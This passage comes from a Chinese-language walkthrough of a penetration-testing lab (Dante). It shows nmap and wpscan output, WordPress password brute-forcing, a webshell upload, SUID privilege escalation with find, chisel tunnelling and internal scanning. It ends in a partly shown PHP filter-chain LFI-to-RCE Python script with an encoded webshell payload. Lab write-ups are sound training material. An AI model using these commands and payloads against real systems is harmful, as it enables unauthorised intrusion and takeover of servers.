allowed (FTP code 230)</span><br><span class="line">|_Can&#x27;t get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 8fa2ffcf4e3eaa2bc26ff45a2ad9e9da (RSA)</span><br><span class="line">|   256 07838eb6f7e672e965db42fdedd693ee (ECDSA)</span><br><span class="line">|_  256 1345c5cadba6b4ae9c097d21cd9d74f4 (ED25519)</span><br><span class="line">65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 2 disallowed entries </span><br><span class="line">|_/wordpress DANTE&#123;fake_flag&#125;</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Linux 4.X|5.X (85%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.6 (85%), Linux 5.0 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 21/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   ...</span><br><span class="line">2   422.66 ms 10.10.110.100</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 72.58 seconds</span><br></pre></td></tr></table></figure>
+
+<p>发现还有一个65000的端口被开放，并且还存在一个&#x2F;wordpress目录，还有一个robots.txt，进入拿到flag：</p>
+<p><img src="https://pic.imgdb.cn/item/6462afda0d2dde57771169b2.jpg"></p>
+<h3 id="It’s-easier-this-way"><a href="#It’s-easier-this-way" class="headerlink" title="It’s easier this way"></a>It’s easier this way</h3><p>既然存在一个部署了wordpress，那就用wpscan扫一下吧：</p>
+<p><img src="https://pic.imgdb.cn/item/6461cefc0d2dde5777b62b0c.jpg"></p>
+<p>观察扫描结果，可以看到扫出来了两个用户名，admin和james。回想刚刚的提示，我们可以尝试去爆破一下james的密码。但是密码太多了，为了节约时间先用cewl来给我们生成个字典：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# cewl http://10.10.110.100:65000/wordpress -w password.txt</span><br><span class="line">CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br></pre></td></tr></table></figure>
+
+<p>之后用wpscan来爆破密码，结果为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://10.10.110.100:65000/wordpress --usernames james -P password.txt </span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.22</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]</span><br><span class="line">[+] Started: Mon May 15 02:14:19 2023</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt</span><br><span class="line"> | Found By: Robots Txt (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | Reference: https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://10.10.110.100:65000/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.1&lt;/generator&gt;</span><br><span class="line"> |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentytwenty</span><br><span class="line"> | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/</span><br><span class="line"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="line"> | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.2</span><br><span class="line"> | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2</span><br><span class="line"> | Style Name: Twenty Twenty</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentytwenty/</span><br><span class="line"> | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: &#x27;Version: 1.2&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:05 &lt;=================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:05</span><br><span class="line"></span><br><span class="line">[i] Config Backup(s) Identified:</span><br><span class="line"></span><br><span class="line">[!] http://10.10.110.100:65000/wordpress/.wp-config.php.swp</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Wp Login against 1 user/s</span><br><span class="line">[SUCCESS] - james / Toyota                                                                                                                                                                                                      </span><br><span class="line">Trying james / Motor Time: 00:00:32 &lt;==================================================================                                                                                      &gt; (400 / 893) 44.79%  ETA: ??:??:??</span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: james, Password: Toyota</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon May 15 02:15:12 2023</span><br><span class="line">[+] Requests Done: 540</span><br><span class="line">[+] Cached Requests: 41</span><br><span class="line">[+] Data Sent: 187.165 KB</span><br><span class="line">[+] Data Received: 2.269 MB</span><br><span class="line">[+] Memory used: 262.699 MB</span><br><span class="line">[+] Elapsed time: 00:00:52</span><br></pre></td></tr></table></figure>
+
+<p>得到一对帐号密码：<code>james:Toyota</code> ，并且发现<a target="_blank" rel="noopener" href="http://10.10.110.100:65000/wordpress/.wp-config.php.swp">http://10.10.110.100:65000/wordpress/.wp-config.php.swp</a> 。尝试用该帐号和密码登录后台，发现还是管理员权限：</p>
+<p><img src="https://pic.imgdb.cn/item/6461cfba0d2dde5777b6f4ce.jpg"></p>
+<p>之后在上传主题那里，上传一个webshell，可以在&#x2F;wordpress&#x2F;wp-content&#x2F;uploads看到：</p>
+<p><img src="https://pic.imgdb.cn/item/6461d0230d2dde5777b76827.jpg"></p>
+<p>之后蚁剑连接拿到shell。在home目录下发现还存在一个叫james的用户：</p>
+<p><img src="https://pic.imgdb.cn/item/6461d1b60d2dde5777b96160.jpg"></p>
+<p>继续用之前的密码登录一下拿到flag：</p>
+<p><img src="https://pic.imgdb.cn/item/6462b0350d2dde577711a337.jpg"></p>
+<h3 id="Show-me-the-way"><a href="#Show-me-the-way" class="headerlink" title="Show me the way"></a>Show me the way</h3><p>发现在james用户目录下存在.bash_histroy，以下是内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">james@DANTE-WEB-NIX01:~$ cat .bash_history</span><br><span class="line">cat .bash_history</span><br><span class="line">cd /home/balthazar</span><br><span class="line">rm .mysql_history</span><br><span class="line">mysql -u balthazar -p TheJoker12345!</span><br></pre></td></tr></table></figure>
+
+<p>之后尝试SUID提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/6461d2b20d2dde5777bafa82.jpg"></p>
+<p>find命令可以用如下方式提权：</p>
+<p><img src="https://pic.imgdb.cn/item/6462b0540d2dde577711b667.jpg"></p>
+<p><code>find . -exec /bin/sh -p \; -quit</code>进入sh，之后给&#x2F;bin&#x2F;bash设置SUID位，再&#x2F;bin&#x2F;bash -p即可。至此拿到DANTE-WEB-NIX01的root，别忘了添加路由。</p>
+<h3 id="Seclusion-is-an-illusion"><a href="#Seclusion-is-an-illusion" class="headerlink" title="Seclusion is an illusion"></a>Seclusion is an illusion</h3><p>接下来用chisel搭一条代理隧道：</p>
+<p><img src="https://pic.imgdb.cn/item/6461e28d0d2dde5777d29efd.jpg"></p>
+<p>用fscan走这条代理扫一下内网：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# fscan -h 172.16.1.0/24 -socks5 127.0.0.1:1080</span><br><span class="line">​</span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">Socks5Proxy: socks5://127.0.0.1:1080</span><br><span class="line">start infoscan</span><br><span class="line">172.16.1.101:21 open</span><br><span class="line">172.16.1.10:80 open</span><br><span class="line">172.16.1.20:22 open</span><br><span class="line">172.16.1.5:21 open</span><br><span class="line">172.16.1.1:80 open</span><br><span class="line">172.16.1.12:22 open</span><br><span class="line">172.16.1.20:80 open</span><br><span class="line">172.16.1.13:80 open</span><br><span class="line">172.16.1.10:22 open</span><br><span class="line">172.16.1.100:21 open</span><br><span class="line">172.16.1.12:80 open</span><br><span class="line">172.16.1.100:22 open</span><br><span class="line">172.16.1.12:21 open</span><br><span class="line">172.16.1.19:80 open</span><br><span class="line">172.16.1.17:80 open</span><br><span class="line">172.16.1.100:80 open</span><br><span class="line">172.16.1.102:80 open</span><br><span class="line">172.16.1.5:135 open</span><br><span class="line">172.16.1.20:135 open</span><br><span class="line">172.16.1.101:135 open</span><br><span class="line">172.16.1.102:135 open</span><br><span class="line">172.16.1.5:139 open</span><br><span class="line">172.16.1.17:139 open</span><br><span class="line">172.16.1.10:139 open</span><br><span class="line">172.16.1.20:139 open</span><br><span class="line">172.16.1.102:139 open</span><br><span class="line">172.16.1.101:139 open</span><br><span class="line">172.16.1.12:443 open</span><br><span class="line">172.16.1.20:443 open</span><br><span class="line">172.16.1.1:443 open</span><br><span class="line">172.16.1.13:443 open</span><br><span class="line">172.16.1.102:443 open</span><br><span class="line">172.16.1.5:445 open</span><br><span class="line">172.16.1.10:445 open</span><br><span class="line">172.16.1.20:445 open</span><br><span class="line">172.16.1.17:445 open</span><br><span class="line">172.16.1.13:445 open</span><br><span class="line">172.16.1.101:445 open</span><br><span class="line">172.16.1.102:445 open</span><br><span class="line">172.16.1.5:1433 open</span><br><span class="line">172.16.1.12:3306 open</span><br><span class="line">172.16.1.102:3306 open</span><br><span class="line">172.16.1.19:8080 open</span><br><span class="line">172.16.1.20:88 open</span><br><span class="line">172.16.1.17:10000 open</span><br><span class="line">[*] alive ports len is: 45</span><br><span class="line">start vulscan</span><br><span class="line">已完成 0/45 [-] Ms17010 172.16.1.13 EOF</span><br><span class="line">[*] WebTitle: http://172.16.1.1         code:301 len:178    title:301 Moved Permanently 跳转url: https://172.16.1.1/</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.101</span><br><span class="line">   [-&gt;]DANTE-WS02</span><br><span class="line">   [-&gt;]172.16.1.101</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.102</span><br><span class="line">   [-&gt;]DANTE-WS03</span><br><span class="line">   [-&gt;]172.16.1.102</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.5</span><br><span class="line">   [-&gt;]DANTE-SQL01</span><br><span class="line">   [-&gt;]172.16.1.5</span><br><span class="line">[*] WebTitle: http://172.16.1.12        code:302 len:0      title:None 跳转url: http://172.16.1.12/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.19        code:200 len:553    title:Index of /</span><br><span class="line">[*] WebTitle: http://172.16.1.100       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] WebTitle: http://172.16.1.13        code:302 len:0      title:None 跳转url: http://172.16.1.13/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.17        code:200 len:963    title:Index of /</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.20</span><br><span class="line">   [-&gt;]DANTE-DC01</span><br><span class="line">   [-&gt;]172.16.1.20</span><br><span class="line">[*] WebTitle: http://172.16.1.10        code:200 len:28842  title:Dante Hosting</span><br><span class="line">[*] WebTitle: https://172.16.1.12       code:302 len:0      title:None 跳转url: https://172.16.1.12/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.102       code:200 len:1237   title:Dante Marriage Registration System :: Home Page</span><br><span class="line">[*] WebTitle: https://172.16.1.102      code:200 len:1237   title:Dante Marriage Registration System :: Home Page</span><br><span class="line">[*] WebTitle: https://172.16.1.13       code:302 len:0      title:None 跳转url: https://172.16.1.13/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.20        code:200 len:3173   title:None</span><br><span class="line">[*] WebTitle: https://172.16.1.1        code:200 len:8999   title:pfSense - Login</span><br><span class="line">[*] WebTitle: https://172.16.1.20       code:200 len:3173   title:None</span><br><span class="line">[+] 172.16.1.20 MS17-010        (Windows Server 2012 R2 Standard 9600)</span><br><span class="line">[*] WebTitle: http://172.16.1.12/dashboard/ code:200 len:7574   title:Welcome to XAMPP</span><br><span class="line">[*] WebTitle: http://172.16.1.13/dashboard/ code:200 len:7576   title:Welcome to XAMPP</span><br><span class="line">[*] WebTitle: http://172.16.1.19:8080   code:403 len:793    title:None</span><br><span class="line">[*] WebTitle: https://172.16.1.12/dashboard/ code:200 len:7574   title:Welcome to XAMPP</span><br><span class="line">[*] WebTitle: https://172.16.1.1/       code:200 len:8999   title:pfSense - Login</span><br><span class="line">[*] WebTitle: https://172.16.1.13/dashboard/ code:200 len:7576   title:Welcome to XAMPP</span><br><span class="line">[+] http://172.16.1.20 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">[+] https://172.16.1.20 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">已完成 45/45</span><br><span class="line">[*] 扫描结束,耗时: 8m5.925407215s</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们看172.16.1.10，刚刚fscan扫到了22,80,139,445这些端口，先进一下web界面吧：</p>
+<p><img src="https://pic.imgdb.cn/item/6461e36f0d2dde5777d3ae2f.jpg"></p>
+<p>随便点旁边一个按钮，注意看上面的链接 ：</p>
+<p><img src="https://pic.imgdb.cn/item/6461e3350d2dde5777d35f82.jpg"></p>
+<p>猜测存在LFI，尝试读一下&#x2F;etc&#x2F;passwd：</p>
+<p><img src="https://pic.imgdb.cn/item/6461e3b20d2dde5777d3f5de.jpg"></p>
+<p>可以读到，并且我们可以看到有一个名为margaret的用户，只是它的shell不是bash而是lshell。因为这个站用的是php，并且存在LFI，所以我们可以构造php filter chain来RCE，关于构造php filter chain来RCE的方法我这里就不过多介绍了，打CTF的师傅们应该接触过，想要了解的可以看看Zedd师傅写的一篇文章：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">hxp CTF 2021 – The End Of LFI?</a>。这篇文章从最简单的LFI开始，一步步构造php filter chain从而实现RCE，师傅们看了之后一定会很有收获的。 我这里直接贴脚本吧：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://172.16.1.10/nav.php&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;id&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"> </span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span 